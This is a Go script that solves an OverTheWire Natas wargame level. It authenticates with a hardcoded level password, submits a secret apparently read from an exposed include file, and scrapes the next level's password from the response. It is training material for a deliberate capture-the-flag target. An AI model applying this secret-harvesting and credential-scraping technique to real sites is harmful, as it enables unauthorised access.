package main

import (
	"fmt"
	"net/http"
	"net/url"
	"io/ioutil"
	"regexp"
	"strings"
)

var (
	username = "natas6"
	password = "fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR"
	urls = fmt.Sprintf("http://%s.natas.labs.overthewire.org",username) 
)

func main (){
	// request, _ := http.NewRequest("GET", url + "/includes/secret.inc", nil)
	data := url.Values{}
	data.Set("secret", "FOEIUWGHFEEUHOFUOIU")
	data.Set("submit", "submit")
	request, _ := http.NewRequest("POST", urls, strings.NewReader(data.Encode()))
	request.SetBasicAuth(username, password)
	request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	response, _ := http.DefaultClient.Do(request)
	defer response.Body.Close()

	content ,_ := ioutil.ReadAll(response.Body)
	// fmt.Println(string(content))
	regex := regexp.MustCompile(`The password for natas(.*)`)
	almost := strings.Split(regex.FindAllString(string(content), 1)[0], " ")
	answer := almost[len(almost) - 1]
	fmt.Println(answer)
}

// ?include
// includes/secret.inc